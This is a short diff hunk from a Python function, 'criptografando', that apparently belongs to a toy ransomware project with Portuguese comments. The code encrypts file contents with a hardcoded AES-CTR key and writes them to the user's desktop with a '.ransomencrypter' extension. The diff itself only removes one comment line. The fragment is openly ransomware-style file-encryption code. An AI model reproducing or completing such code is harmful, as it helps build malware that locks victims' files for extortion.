@@ -41,7 +41,6 @@ def criptografando():
             key = b"1ab2c3e4f5g6h7i8"  # 16 byts key - chave
             aes = pyaes.AESModeOfOperationCTR(key)  # gera a criptografia
             crypto_data = aes.encrypt(data_arqui)
-            # Salvando arquivo novo (.ransomencrypter)
             novo_arqui = format_arqui + ".ransomencrypter"
             novo_arqui = open(f'{desktop}\\{novo_arqui}', 'wb')
             novo_arqui.write(crypto_data)
